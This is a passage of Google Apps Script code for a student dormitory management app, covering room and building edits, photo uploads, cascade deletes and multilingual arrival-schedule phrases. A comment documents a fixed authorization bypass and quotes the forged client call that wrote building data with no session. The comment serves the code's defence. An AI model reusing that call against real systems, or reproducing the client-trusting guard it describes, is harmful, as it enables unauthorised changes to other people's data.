// (col 14) -> plain text (@), so values with leading zeros (e.g. "0123") are
// preserved instead of being coerced to numbers. Formats the whole data range
// of each column so existing and future rows stay consistent.
function _applyRoomInfoFormats_(sheet) {
  try {
    const lastRow = sheet.getLastRow();
    if (lastRow < 2) return; // only header (or empty)
    const n = lastRow - 1;   // data rows, excluding header
    sheet.getRange(2, 4, n, 1).setNumberFormat("#,##0"); // Rent_Price
    sheet.getRange(2, 5, n, 1).setNumberFormat("@");      // Mail_Box_Code (plain text)
    sheet.getRange(2, 6, n, 1).setNumberFormat("@");      // Delivery_Box_Code (plain text)
    sheet.getRange(2, 7, n, 1).setNumberFormat("@");      // Wifi_Info (plain text)
    sheet.getRange(2, 14, n, 1).setNumberFormat("@");     // Room_Code / 部屋パスワード (plain text)
  } catch (e) { /* formatting is best-effort; never block the save */ }
}

function updateRoom(userRole, formObject, userPerms) {
  if (!_hasPerm_(userRole, userPerms, "edit_dorms")) throw new Error("権限がありません");
  const sheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(SHEET_ROOM);
  const rowIndex = parseInt(formObject.editRowIndex);

  // Duplicate guard: same building + room number on a DIFFERENT row.
  const existing = sheet.getDataRange().getDisplayValues();
  const eBldg = String(formObject.editBuilding || "").trim();
  const eRoom = String(formObject.editRoomNumber || "").trim().toLowerCase();
  for (let i = 1; i < existing.length; i++) {
    if ((i + 1) === rowIndex) continue; // skip the row being edited
    if (String(existing[i][1] || "").trim() === eBldg &&
        String(existing[i][2] || "").trim().toLowerCase() === eRoom) {
      throw new Error("DUPLICATE_ROOM:この建物に同じ部屋番号「" + formObject.editRoomNumber + "」が既に存在します。");
    }
  }

  // Set text/number formats BEFORE writing so values with leading zeros (WiFi,
  // codes, room password) aren't coerced to numbers on write.
  try {
    sheet.getRange(rowIndex, 4, 1, 1).setNumberFormat("#,##0"); // Rent_Price
    sheet.getRange(rowIndex, 5, 1, 1).setNumberFormat("@");      // Mail_Box_Code
    sheet.getRange(rowIndex, 6, 1, 1).setNumberFormat("@");      // Delivery_Box_Code
    sheet.getRange(rowIndex, 7, 1, 1).setNumberFormat("@");      // Wifi_Info
    sheet.getRange(rowIndex, 14, 1, 1).setNumberFormat("@");     // Room_Code / 部屋パスワード
  } catch (e) { /* best-effort */ }
  sheet.getRange(rowIndex, 2, 1, 20).setValues([_cellSafeRow_([
    formObject.editBuilding, formObject.editRoomNumber, formObject.editRentPrice,
    formObject.editMailboxCode, formObject.editDeliveryBoxCode,  
    formObject.editWifiInfo, formObject.editOccupancyStatus, formObject.editBicycleNumber,
    formObject.editStudentId, formObject.editStudentName, formObject.editNationality, formObject.editStudentClass,
    formObject.editRoomCode || "", formObject.editRemarks || "",
    _combineLang_(formObject.editWaterBillOverrideEn, formObject.editWaterBillOverrideJp),
    _combineLang_(formObject.editElecBillOverrideEn, formObject.editElecBillOverrideJp),
    _combineLang_(formObject.editGasBillOverrideEn, formObject.editGasBillOverrideJp),
    _combineLang_(formObject.editInternetBillOverrideEn, formObject.editInternetBillOverrideJp),
    _combineLang_(formObject.editOtherBillOverrideEn, formObject.editOtherBillOverrideJp),
    _combineLang_(formObject.editHotWaterBillOverrideEn, formObject.editHotWaterBillOverrideJp)
  ])]);
  _logActivity_(_actorFrom_(formObject, userRole), "部屋を更新", formObject.editBuilding + " " + formObject.editRoomNumber, "");
  return "部屋データを更新しました。";
}

// ⚠️ Guarded through _hasPerm_, NOT an inline read of formObject.permissions.
// It used to be `!_isMasterRole_(formObject.systemRole) && !(formObject.permissions
// && String(formObject.permissions).split(",").indexOf("edit_dorms") !== -1)`.
// _isMasterRole_ consults the session; the half beside it read the string the
// BROWSER sent and never went through _effectivePerms_ — and because the two were
// OR'd, the client-trusting half was sufficient on its own. Measured:
// google.script.run.saveBuilding({systemRole:"", permissions:"edit_dorms", …})
// wrote Building_Info with no session and no account, straight past AUTH_ENFORCE.
// Exactly the shape the _roleIsAnyOf_ comment describes — a session-aware guard
// OR'd with a client-supplied one is not a guard. updateBuilding was identical.
function saveBuilding(formObject) {
  if (!_hasPerm_(formObject.systemRole, formObject.permissions, "edit_dorms")) throw new Error("権限がありません");
  try {
    const sheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(SHEET_BUILDING);
    _ensureBuildingColumns_(sheet);

    // Duplicate guard: reject an existing building ID.
    const existingB = sheet.getDataRange().getDisplayValues();
    const newId = String(formObject.bldgId || "").trim().toLowerCase();
    for (let i = 1; i < existingB.length; i++) {
      if (String(existingB[i][0] || "").trim().toLowerCase() === newId && newId !== "") {
        throw new Error("DUPLICATE_BLDG:建物ID「" + formObject.bldgId + "」は既に登録されています。");
      }
    }

    const photoFolder = DriveApp.getFolderById(_requireConfig_(CONFIG_PHOTO_FOLDER));
    const combineLang = (en, jp) => { en = (en == null ? '' : String(en)); jp = (jp == null ? '' : String(jp)); return (en === '' && jp === '') ? '' : (en + '\n' + jp); };
    
    function uploadPhoto(photoObj, nameSuffix) {
      if (photoObj && photoObj.base64) {
        const decodedBytes = Utilities.base64Decode(photoObj.base64);
        const blob = Utilities.newBlob(decodedBytes, photoObj.mimeType, formObject.bldgId + "_" + nameSuffix + ".jpg");
        const file = photoFolder.createFile(blob);
        return file.getId();
      }
      return "";
    }
    
    const exteriorId  = uploadPhoto(formObject.exteriorPhoto,  "Exterior");
    const wm1Id       = uploadPhoto(formObject.wm1Photo,       "WM_1");
    const wm2Id       = uploadPhoto(formObject.wm2Photo,       "WM_2");
    const wm3Id       = uploadPhoto(formObject.wm3Photo,       "WM_3");
    const garbage1Id  = uploadPhoto(formObject.garbage1Photo,  "Garbage_1");
    const garbage2Id  = uploadPhoto(formObject.garbage2Photo,  "Garbage_2");
    const garbage3Id  = uploadPhoto(formObject.garbage3Photo,  "Garbage_3");
    const bicycle1Id  = uploadPhoto(formObject.bicycle1Photo,  "Bicycle_1");
    const bicycle2Id  = uploadPhoto(formObject.bicycle2Photo,  "Bicycle_2");
    const bicycle3Id  = uploadPhoto(formObject.bicycle3Photo,  "Bicycle_3");

    sheet.appendRow(_cellSafeRow_([
      formObject.bldgId, formObject.bldgNameEn, formObject.bldgNameJp,
      formObject.bldgAddressEn, formObject.bldgAddressJp,
      formObject.garbageHousehold, formObject.garbageCans, formObject.garbagePlastic,
      "", formObject.routeUrl1, formObject.routeUrl2, 
      combineLang(formObject.garbagePlaceInfoEn, formObject.garbagePlaceInfoJp), 
      combineLang(formObject.remarksEn, formObject.remarksJp), 
      combineLang(formObject.waterBillEn, formObject.waterBillJp), 
      combineLang(formObject.elecBillEn, formObject.elecBillJp), 
      combineLang(formObject.gasBillEn, formObject.gasBillJp), 
      combineLang(formObject.internetBillEn, formObject.internetBillJp),
      combineLang(formObject.autoLockEn, formObject.autoLockJp), 
      formObject.garbageHouseholdBag, formObject.garbageCansBag, formObject.garbagePlasticBag,
      wm1Id, wm2Id, wm3Id, garbage1Id, garbage2Id, garbage3Id,
      formObject.garbagePaper, formObject.garbagePaperBag, bicycle1Id, bicycle2Id, bicycle3Id,
      exteriorId, 
      combineLang(formObject.exteriorCaptionEn, formObject.exteriorCaptionJp), 
      combineLang(formObject.wm1CaptionEn, formObject.wm1CaptionJp), 
      combineLang(formObject.wm2CaptionEn, formObject.wm2CaptionJp), 
      combineLang(formObject.wm3CaptionEn, formObject.wm3CaptionJp),
      combineLang(formObject.garbage1CaptionEn, formObject.garbage1CaptionJp), 
      combineLang(formObject.garbage2CaptionEn, formObject.garbage2CaptionJp), 
      combineLang(formObject.garbage3CaptionEn, formObject.garbage3CaptionJp),
      combineLang(formObject.bicycle1CaptionEn, formObject.bicycle1CaptionJp), 
      combineLang(formObject.bicycle2CaptionEn, formObject.bicycle2CaptionJp), 
      combineLang(formObject.bicycle3CaptionEn, formObject.bicycle3CaptionJp),
      combineLang(formObject.otherBillEn, formObject.otherBillJp),
      "",                                                            // [44] docIds (managed separately)
      combineLang(formObject.hotWaterBillEn, formObject.hotWaterBillJp), // [45] 給湯代
      String(formObject.rentDefault || "").replace(/,/g, ""),              // [46] 家賃 building default
      formObject.garbageBurnablePlastic,                             // [47] 燃えるゴミ(プラスチックを含む) day
      formObject.garbageBurnablePlasticBag                           // [48] its bag
    ]));
    _applyBuildingInfoFormats_(sheet);
    _logActivity_(_actorFrom_(formObject, formObject.systemRole), "建物を追加", (formObject.bldgNameJp || formObject.bldgNameEn || formObject.bldgId), "");
    return "建物マスターを保存しました。";
  } catch (error) { throw new Error(error.toString()); }
}

// Apply persistent formats to Building_Info: Auto_Lock (col 18) -> plain text (@).
// Building_Info is written back as a WHOLE ROW addressed by index, and
// updateBuilding ends with getRange(row, 1, 1, existingRow.length).setValues().
// If the code builds a row wider than the sheet's grid, that getRange exceeds
// the grid and every building save throws.
//
// Widening here, on the save paths themselves, rather than relying on a
// migration having been run first: otherwise the deploy order becomes the bug.
// A narrow sheet is repaired by the next save instead of breaking it.
const BUILDING_COLS = 49;   // 0-46 legacy, 47 燃えるゴミ(プラ含む) day, 48 its bag

function _ensureBuildingColumns_(sheet) {
  try {
    const have = sheet.getMaxColumns();
    if (have < BUILDING_COLS) sheet.insertColumnsAfter(have, BUILDING_COLS - have);
  } catch (e) { /* best-effort; a genuinely un-widenable sheet will surface at the write */ }
}

// Label the two 燃えるゴミ(プラスチックを含む) columns so the sheet stays readable
// to a human. Purely cosmetic: nothing reads Building_Info's header row — every
// access to this sheet is positional — so the app works whether or not this has
// been run. _ensureBuildingColumns_ handles the part that actually matters.
//
// Idempotent, and safe to run on a sheet of any width.
function migrateBuildingAddBurnablePlastic() {
  _requireMaintenanceUnlock_("migrateBuildingAddBurnablePlastic");
  const sheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(SHEET_BUILDING);
  if (!sheet) return "Building_Info が見つかりません。";

  const H_DAY = "燃えるゴミ(プラスチックを含む)";
  const H_BAG = "燃えるゴミ(プラスチックを含む)_袋";

  const before = sheet.getMaxColumns();
  const headersBefore = sheet.getRange(1, 1, 1, Math.max(sheet.getLastColumn(), 1)).getDisplayValues()[0];
  if (headersBefore[47] === H_DAY && headersBefore[48] === H_BAG) {
    return "already migrated — " + before + " columns, nothing to do";
  }

  _snapshotSheet_(SHEET_BUILDING);
  _ensureBuildingColumns_(sheet);
  sheet.getRange(1, 48).setValue(H_DAY);   // 1-based column 48 = index 47
  sheet.getRange(1, 49).setValue(H_BAG);   // 1-based column 49 = index 48
  SpreadsheetApp.flush();
  return "migrated. Building_Info widened " + before + " -> " + sheet.getMaxColumns() +
         " columns; headers 48/49 set to " + H_DAY + " / " + H_BAG;
}

function _applyBuildingInfoFormats_(sheet) {
  try {
    const lastRow = sheet.getLastRow();
    if (lastRow < 2) return;
    const n = lastRow - 1;
    sheet.getRange(2, 18, n, 1).setNumberFormat("@"); // Auto_Lock (plain text)
    sheet.getRange(2, 47, n, 1).setNumberFormat("#,##0"); // 家賃 building default (currency)
  } catch (e) { /* best-effort */ }
}

// Delete a building and ALL of its rooms (cascade). Admin-only and destructive,
// so both sheets are snapshotted first (recoverable via the data-safety panel).
// Rooms are matched to the building by ID (Room_Info col B / idx 1).
// Delete a single room by its unique Room_Info row index (building+number is
// NOT unique across the sheet, so we key off the row). Gated by edit_dorms, the
// same permission as editing a room. Snapshots first (recoverable).
function deleteRoom(userRole, rowIndex, userPerms, actorName, actorId) {
  if (!_hasPerm_(userRole, userPerms, "edit_dorms")) {
    throw new Error("権限がありません");
  }
  const sheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(SHEET_ROOM);
  if (!sheet) throw new Error("部屋データが見つかりません。");
  const ri = parseInt(rowIndex, 10);
  const lastRow = sheet.getLastRow();
  if (isNaN(ri) || ri < 2 || ri > lastRow) throw new Error("削除対象の部屋が見つかりません。");

  // Capture a label for the audit log before deleting.
  const row = sheet.getRange(ri, 1, 1, Math.min(sheet.getLastColumn(), 4)).getDisplayValues()[0];
  const label = (row[1] || "") + " " + (row[2] || ""); // building id + room number

  const gone = _sheetRowForLog_(sheet, ri);
  sheet.deleteRow(ri);
  try { _logActivity_({ role: userRole, name: actorName || "", id: actorId || "" }, "部屋を削除", label.trim(), gone); } catch (e) {}
  return { deleted: true };
}

function deleteBuilding(bldgId, userRole, actorName, actorId) {
  if (!_isAdminLevel_(userRole)) throw new Error("管理者のみ建物を削除できます。");
  const id = String(bldgId == null ? "" : bldgId).trim();
  if (id === "") throw new Error("建物IDが指定されていません。");

  const ss = SpreadsheetApp.getActiveSpreadsheet();
  const bSheet = ss.getSheetByName(SHEET_BUILDING);
  const rSheet = ss.getSheetByName(SHEET_ROOM);
  if (!bSheet) throw new Error("建物データが見つかりません。");

  // Locate the building row.
  const bData = bSheet.getDataRange().getDisplayValues();
  let bRowIndex = -1, bldgLabel = id;
  for (let i = 1; i < bData.length; i++) {
    if (String(bData[i][0]).trim() === id) {
      bRowIndex = i + 1;
      bldgLabel = bData[i][2] || bData[i][1] || id; // JP name, else EN, else ID
      break;
    }
  }
  if (bRowIndex === -1) throw new Error("指定された建物が見つかりません: " + id);

  // Snapshot both sheets BEFORE any deletion (recoverable).
  try { _snapshotSheet_(SHEET_BUILDING); } catch (e) {}
  let roomCount = 0;
  if (rSheet) {
    try { _snapshotSheet_(SHEET_ROOM); } catch (e) {}
    // Collect room rows for this building, then delete bottom-up so row indices
    // don't shift mid-loop.
    const rData = rSheet.getDataRange().getDisplayValues();
    let rowsToDelete = [];
    for (let i = 1; i < rData.length; i++) {
      if (String(rData[i][1]).trim() === id) rowsToDelete.push(i + 1);
    }
    roomCount = rowsToDelete.length;
    rowsToDelete.sort(function(a, b){ return b - a; }); // descending
    rowsToDelete.forEach(function(rx){ rSheet.deleteRow(rx); });
  }

  // Delete the building row.
  bSheet.deleteRow(bRowIndex);

  try {
    _logActivity_({ role: userRole, name: actorName, id: actorId }, "建物を削除",
      bldgLabel + " (ID:" + id + ") / 部屋" + roomCount + "件", "");
  } catch (e) {}

  return { deleted: true, building: bldgLabel, roomsDeleted: roomCount };
}

// Read via _readTabs_ (batchGet) rather than getDataRange: the same swap made in
// saveScheduleBatch, where the batched read measured 283ms against 597ms. Both
// yield FORMATTED_VALUE strings, and every consumer here either compares them as
// strings or drops them straight into a form field.
//
// Deliberately NOT cached. Nine functions write Building_Info, and stale data in
// an edit form is worse than stale display data — the user would save the stale
// values straight back over the real ones.
function getSpecificBuilding(bldgId) {
  _requireSession_("getSpecificBuilding");
  const data = _readTabs_([SHEET_BUILDING])[SHEET_BUILDING] || [];
  for (let i = 1; i < data.length; i++) {
    if (String(data[i][0]).trim() === String(bldgId).trim()) {
      return { rowIndex: i + 1, data: data[i] };
    }
  }
  throw new Error("建物データが見つかりません。（SYS-03）");
}

// See the warning on saveBuilding — this had the identical client-trusting OR,
// and overwrote an EXISTING building row with no session at all.
function updateBuilding(formObject) {
  if (!_hasPerm_(formObject.systemRole, formObject.permissions, "edit_dorms")) throw new Error("権限がありません");
  try {
    const sheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(SHEET_BUILDING);
    _ensureBuildingColumns_(sheet);
    const photoFolder = DriveApp.getFolderById(_requireConfig_(CONFIG_PHOTO_FOLDER));
    const rowIndex = parseInt(formObject.editBldgRowIndex);
    const combineLang = (en, jp) => { en = (en == null ? '' : String(en)); jp = (jp == null ? '' : String(jp)); return (en === '' && jp === '') ? '' : (en + '\n' + jp); };

    function uploadPhoto(photoObj, nameSuffix, existingId) {
      if (photoObj && photoObj.base64) {
        const decodedBytes = Utilities.base64Decode(photoObj.base64);
        const blob = Utilities.newBlob(decodedBytes, photoObj.mimeType, formObject.bldgId + "_" + nameSuffix + ".jpg");
        const file = photoFolder.createFile(blob);
        return file.getId();
      }
      return existingId || ""; 
    }

    const exteriorId  = uploadPhoto(formObject.exteriorPhoto,  "Exterior",  formObject.existingExteriorId);
    const wm1Id       = uploadPhoto(formObject.wm1Photo,       "WM_1",      formObject.existingWm1Id);
    const wm2Id       = uploadPhoto(formObject.wm2Photo,       "WM_2",      formObject.existingWm2Id);
    const wm3Id       = uploadPhoto(formObject.wm3Photo,       "WM_3",      formObject.existingWm3Id);
    const garbage1Id  = uploadPhoto(formObject.garbage1Photo,  "Garbage_1", formObject.existingGarbage1Id);
    const garbage2Id  = uploadPhoto(formObject.garbage2Photo,  "Garbage_2", formObject.existingGarbage2Id);
    const garbage3Id  = uploadPhoto(formObject.garbage3Photo,  "Garbage_3", formObject.existingGarbage3Id);
    const bicycle1Id  = uploadPhoto(formObject.bicycle1Photo,  "Bicycle_1", formObject.existingBicycle1Id);
    const bicycle2Id  = uploadPhoto(formObject.bicycle2Photo,  "Bicycle_2", formObject.existingBicycle2Id);
    const bicycle3Id  = uploadPhoto(formObject.bicycle3Photo,  "Bicycle_3", formObject.existingBicycle3Id);

    // Both bounds come from BUILDING_COLS so they can never drift apart. If the
    // read width and the padding width disagree, the row is written back short
    // and punches a hole through docIds(44) — see TECHNICAL_REFERENCE §4.3.
    let maxCols = Math.max(sheet.getLastColumn(), BUILDING_COLS); // docIds(44), 給湯代(45), 家賃(46), 燃えるゴミ(プラ含む)(47-48)
    let existingRow = sheet.getRange(rowIndex, 1, 1, maxCols).getValues()[0];
    // Ensure the array is long enough so setting [47] doesn't create a hole at [44].
    while (existingRow.length < BUILDING_COLS) existingRow.push("");
    
    for(let i = 0; i < 43; i++) {
      if (existingRow[i] === undefined || existingRow[i] === null) existingRow[i] = "";
    }

    existingRow[0] = formObject.bldgId;
    existingRow[1] = formObject.bldgNameEn;
    existingRow[2] = formObject.bldgNameJp;
    existingRow[3] = formObject.bldgAddressEn;
    existingRow[4] = formObject.bldgAddressJp;
    existingRow[5] = formObject.garbageHousehold;
    existingRow[6] = formObject.garbageCans;
    existingRow[7] = formObject.garbagePlastic;
    existingRow[11] = combineLang(formObject.garbagePlaceInfoEn, formObject.garbagePlaceInfoJp);
    existingRow[12] = combineLang(formObject.remarksEn, formObject.remarksJp);
    existingRow[13] = combineLang(formObject.waterBillEn, formObject.waterBillJp);
    existingRow[14] = combineLang(formObject.elecBillEn, formObject.elecBillJp);
    existingRow[15] = combineLang(formObject.gasBillEn, formObject.gasBillJp);
    existingRow[16] = combineLang(formObject.internetBillEn, formObject.internetBillJp);
    existingRow[17] = combineLang(formObject.autoLockEn, formObject.autoLockJp);
    existingRow[18] = formObject.garbageHouseholdBag;
    existingRow[19] = formObject.garbageCansBag;
    existingRow[20] = formObject.garbagePlasticBag;
    existingRow[21] = wm1Id;
    existingRow[22] = wm2Id;
    existingRow[23] = wm3Id;
    existingRow[24] = garbage1Id;
    existingRow[25] = garbage2Id;
    existingRow[26] = garbage3Id;
    existingRow[27] = formObject.garbagePaper;
    existingRow[28] = formObject.garbagePaperBag;
    existingRow[29] = bicycle1Id;
    existingRow[30] = bicycle2Id;
    existingRow[31] = bicycle3Id;
    existingRow[32] = exteriorId;
    existingRow[9]  = formObject.routeUrl1 || "";
    existingRow[10] = formObject.routeUrl2 || "";
    existingRow[33] = combineLang(formObject.exteriorCaptionEn, formObject.exteriorCaptionJp);
    existingRow[34] = combineLang(formObject.wm1CaptionEn, formObject.wm1CaptionJp);
    existingRow[35] = combineLang(formObject.wm2CaptionEn, formObject.wm2CaptionJp);
    existingRow[36] = combineLang(formObject.wm3CaptionEn, formObject.wm3CaptionJp);
    existingRow[37] = combineLang(formObject.garbage1CaptionEn, formObject.garbage1CaptionJp);
    existingRow[38] = combineLang(formObject.garbage2CaptionEn, formObject.garbage2CaptionJp);
    existingRow[39] = combineLang(formObject.garbage3CaptionEn, formObject.garbage3CaptionJp);
    existingRow[40] = combineLang(formObject.bicycle1CaptionEn, formObject.bicycle1CaptionJp);
    existingRow[41] = combineLang(formObject.bicycle2CaptionEn, formObject.bicycle2CaptionJp);
    existingRow[42] = combineLang(formObject.bicycle3CaptionEn, formObject.bicycle3CaptionJp);
    existingRow[43] = combineLang(formObject.otherBillEn, formObject.otherBillJp);
    existingRow[45] = combineLang(formObject.hotWaterBillEn, formObject.hotWaterBillJp); // 給湯代
    existingRow[46] = String(formObject.rentDefault || "").replace(/,/g, ""); // 家賃 building default
    // [44] docIds is deliberately NOT assigned here — it is managed by the 別紙
    // upload/remove handlers, and writing it from the form would wipe them.
    existingRow[47] = formObject.garbageBurnablePlastic;      // 燃えるゴミ(プラスチックを含む)
    existingRow[48] = formObject.garbageBurnablePlasticBag;

    // existingRow is the whole building row read back and edited in place, so the
    // guard covers every free-text field on it in one pass.
    sheet.getRange(rowIndex, 1, 1, existingRow.length).setValues([_cellSafeRow_(existingRow)]);
    try { sheet.getRange(rowIndex, 18, 1, 1).setNumberFormat("@"); } catch (e) { /* best-effort */ }
    _logActivity_(_actorFrom_(formObject, formObject.systemRole), "建物を更新", (formObject.bldgNameJp || formObject.bldgNameEn || formObject.bldgId), "");
    return "建物データを更新しました。";
  } catch (error) { throw new Error(error.toString()); }
}

// --- 5. PDF EXPORT ENGINE ---
// =============================================================================
// 入寮時渡すスケジュール — the printable arrival schedule handed to an accepted student.
//
// ⚠️ TWO LANGUAGES, AND 日本語 IS THE CONSTANT ONE. Every printed line is Japanese
// plus the student's own language; the second language is chosen per student and
// English is simply one of the choices. A phrase with no Japanese is an incomplete
// phrase, not a translatable one.
//
// ⚠️ LANGUAGE COLUMNS ARE LOCATED BY HEADER NAME, never by index. The set grows —
// adding a language IS adding a column — and identity-by-position is this file's
// oldest bug class (CLAUDE.md). Nothing here may assume column order.
// =============================================================================

const SCHED_PHRASE_SHEET = "Schedule_Phrases";
const SCHED_TEMPLATE_SHEET = "Schedule_Templates";
const SCHED_DAYTYPE_SHEET = "Schedule_DayTypes";

// ⚠️ Seeded translations that have not been supplied yet carry this prefix. The
// renderer treats such a value as ABSENT and falls back to Japanese alone, so a
// placeholder can never reach a student's sheet. Clearing the cell does the same
// thing — the two paths must stay indistinguishable (tests/schedule.test.js).
const SCHED_TODO_PREFIX = "【要翻訳】";

// キー and 分類 are fixed; everything after them is a language column.
const SCHED_PHRASE_FIXED_COLS = ["キー", "分類"];

// ⚠️ 日本語 first, and it is not optional — it is the constant half of every printed
// line. English is a language like any other here; it happens to be what the two
// reference sheets used.
const SCHED_SEED_LANGUAGES = ["日本語", "English", "ネパール語", "ベトナム語", "ミャンマー語", "シンハラ語", "インドネシア語", "中国語"];

// The lines that actually appear on the reference sheets, so the feature is usable
// the day it ships rather than after someone fills a blank sheet. 日本語 and English
// are real; every other language is a 【要翻訳】 placeholder for the admin screen to
// replace, and the renderer treats those as absent.
// 日程の種別 — staff think in DAYS, not in lines. Each is an ordered list of phrase
// keys; picking one fills a day block with exactly those lines.
// ⚠️ A flat comma-separated list, NOT JSON: the order is the whole meaning here, and
// flat keeps it editable by hand in the sheet. (Schedule_Templates is JSON because
// its content is genuinely nested; this is not.)
const SCHED_SEED_DAYTYPES = [
  ["手続き",   1, "bring_passport,jp_interview"],
  ["口座開設", 2, "bank_account,bring_residence"],
  ["入学式",   3, "entrance_ceremony,orientation,bring_slippers"],
  ["授業開始", 4, "class_starts"]
];

const SCHED_SEED_PHRASES = (function () {
  const todo = SCHED_TODO_PREFIX;
  // [key, category, 日本語, English] — the remaining languages are filled below.
  const base = [
    ["bring_passport", "持ち物", "パスポートと在留カードをお持ちください。", "Please bring your passport and residence card."],
    ["bring_residence", "持ち物", "在留カードをお持ちください。", "(Please bring your residence card.)"],
    ["bring_slippers", "持ち物", "上履きと、筆記用具・ノートをお持ちください。", "(Please bring indoor slippers and a notebook with a pen for taking notes.)"],
    ["jp_interview", "手続き", "日本語のインタビューと住所登録", "Japanese interview and address registration"],
    ["bank_account", "手続き", "銀行口座の開設", "To open a bank account"],
    ["entrance_ceremony", "行事", "入学式", "Entrance Ceremony"],
    ["lunch_provided", "行事", "昼食（学校が用意します）", "Lunch Time (lunch will be prepared by school)"],
    ["orientation", "行事", "オリエンテーション", "School Orientation"],
    ["class_starts", "授業", "授業開始（クラスは入学式で発表します）", "Class starts (Your class will be announced during entrance ceremony)"],
    // ⚠️ 分類 = キャンパス is not a schedule line — it is the venue dropdown on a day
    // block. Keeping campuses here rather than in a fourth sheet is what gives them
    // an English and a native form like every other phrase; the two frontend filters
    // (the campus select offers only these, the line pickers exclude them) are what
    // stops one appearing as a bullet.
    ["campus_main", "キャンパス", "本校キャンパス", "Main Campus"],
    ["campus_second", "キャンパス", "第二キャンパス", "Second Campus"]
  ];
  return base.map(function (b) {
    let row = [b[0], b[1], b[2], b[3]];
    // one 【要翻訳】 cell per remaining language, in SCHED_SEED_LANGUAGES order
    for (let i = 2; i < SCHED_SEED_LANGUAGES.length; i++) row.push(todo + b[3]);
    return row;
  });
})();

function _schedPhraseSheet_() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  let sh = ss.getSheetByName(SCHED_PHRASE_SHEET);
  if (!sh) {
    sh = ss.insertSheet(SCHED_PHRASE_SHEET);
    sh.appendRow(SCHED_PHRASE_FIXED_COLS.concat(SCHED_SEED_LANGUAGES));
    sh.setFrozenRows(1);
    SCHED_SEED_PHRASES.forEach(function (row) { sh.appendRow(_cellSafeRow_(row)); });
  }
  return sh;
}

function _schedDayTypeSheet_() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  let sh = ss.getSheetByName(SCHED_DAYTYPE_SHEET);
  if (!sh) {
    sh = ss.insertSheet(SCHED_DAYTYPE_SHEET);
    sh.appendRow(["名前", "並び順", "文言キー"]);
    sh.setFrozenRows(1);
    SCHED_SEED_DAYTYPES.forEach(function (row) { sh.appendRow(_cellSafeRow_(row)); });
  }
  return sh;
}

function _schedDayTypeRows_() {
  const data = _schedDayTypeSheet_().getDataRange().getDisplayValues();
  let out = [];
  for (let i = 1; i < data.length; i++) {
    const name = String(data[i][0] || "").trim();
    if (name === "") continue;
    out.push({
      name: name,
      order: parseInt(data[i][1], 10) || 0,
      // ⚠️ Empty segments dropped: a trailing comma or a hand-edit that leaves
      // ",," must not become a blank bullet on a student's sheet.
      keys: String(data[i][2] || "").split(",")
              .map(function (k) { return k.trim(); })
              .filter(function (k) { return k !== ""; })
    });
  }
  out.sort(function (a, b) { return a.order - b.order; });
  return out;
}

function saveScheduleDayType(role, perms, dt) {
  if (!_hasPerm_(role, perms, "manage_student_schedule")) throw new Error("権限がありません");
  const name = String((dt && dt.name) || "").trim();
  if (name === "") throw new Error("種別名を入力してください。");
  const sh = _schedDayTypeSheet_();
  const data = sh.getDataRange().getDisplayValues();
  const row = _cellSafeRow_([name, String((dt && dt.order) || 0),
                            ((dt && dt.keys) || []).join(",")]);
  for (let i = 1; i < data.length; i++) {
    if (String(data[i][0] || "").trim() === name) {
      sh.getRange(i + 1, 1, 1, row.length).setValues([row]);
      return { ok: true };
    }
  }
  sh.appendRow(row);
  return { ok: true };
}

// One trip for a whole 文言管理 session.
//
// ⚠️ WHY THIS EXISTS. saveSchedulePhrase and saveScheduleDayType each read their ENTIRE
// sheet to write one row. 文言管理 used to call one of them per edited cell, and its
// success handler re-rendered the table — so typing a row of translations meant a
// full-sheet read per cell and an async rebuild landing in the middle of the next field.
// The screen now queues edits and sends them here once.
//
// ops: { phrases: [phrase…], delPhrases: [key…],
//        dayTypes: [{origName, name, order, keys}…], delDayTypes: [name…] }
//
// ⚠️ Deletes are applied BEFORE upserts. A row deleted and re-added in one session must
// end as an add, not be deleted after it was written.
function saveSchedulePhrasesBatch(role, perms, ops) {
  if (!_hasPerm_(role, perms, "manage_student_schedule")) throw new Error("権限がありません");
  ops = ops || {};
  const out = { phrases: 0, dayTypes: 0, deleted: 0 };

  // ---- 文言 ------------------------------------------------------------------
  const delP = (ops.delPhrases || []).map(function (k) { return String(k || "").trim(); })
                                     .filter(function (k) { return k !== ""; });
  const upP = (ops.phrases || []).filter(function (p) {
    return p && String(p.key || "").trim() !== "";
  });
  if (delP.length || upP.length) {
    const sh = _schedPhraseSheet_();
    let data = sh.getDataRange().getDisplayValues();
    const headers = (data[0] || []).map(function (h) { return String(h).trim(); });
    const kCol = headers.indexOf("キー");
    if (delP.length) {
      for (let i = data.length - 1; i >= 1; i--) {
        if (delP.indexOf(String(data[i][kCol] || "").trim()) !== -1) { sh.deleteRow(i + 1); out.deleted++; }
      }
      data = sh.getDataRange().getDisplayValues();   // row numbers moved
    }
    upP.forEach(function (p) {
      const key = String(p.key).trim();
      const text = p.text || {};
      // ⚠️ Built against the CURRENT header row, so a reordered or newly added column
      // lands in its own place instead of shifting every value one to the left.
      const row = _cellSafeRow_(headers.map(function (h) {
        if (h === "キー") return key;
        if (h === "分類") return String(p.category || "");
        return text[h] === undefined ? "" : String(text[h]);
      }));
      let found = -1;
      for (let i = 1; i < data.length; i++) {
        if (String(data[i][kCol] || "").trim() === key) { found = i; break; }
      }
      if (found !== -1) { sh.getRange(found + 1, 1, 1, row.length).setValues([row]); }
      else { sh.appendRow(row); data.push(row); }
      out.phrases++;
    });
  }

  // ---- 日程の種別 --------------------------------------------------------------
  const delD = (ops.delDayTypes || []).map(function (n) { return String(n || "").trim(); })
                                      .filter(function (n) { return n !== ""; });
  const upD = (ops.dayTypes || []).filter(function (d) {
    return d && String(d.name || "").trim() !== "";
  });
  if (delD.length || upD.length) {
    const sh = _schedDayTypeSheet_();
    let data = sh.getDataRange().getDisplayValues();
    if (delD.length) {
      for (let i = data.length - 1; i >= 1; i--) {
        if (delD.indexOf(String(data[i][0] || "").trim()) !== -1) { sh.deleteRow(i + 1); out.deleted++; }
      }
      data = sh.getDataRange().getDisplayValues();
    }
    upD.forEach(function (d) {
      const name = String(d.name).trim();
      // ⚠️ Located by origName, NOT by the new name. 種別名 is an editable field, and
      // saveScheduleDayType matched on the name it was handed — so renaming 手続き found
      // no row and APPENDED a second one, leaving the original behind. The screen hid it
      // (the client array holds one) until the next load.
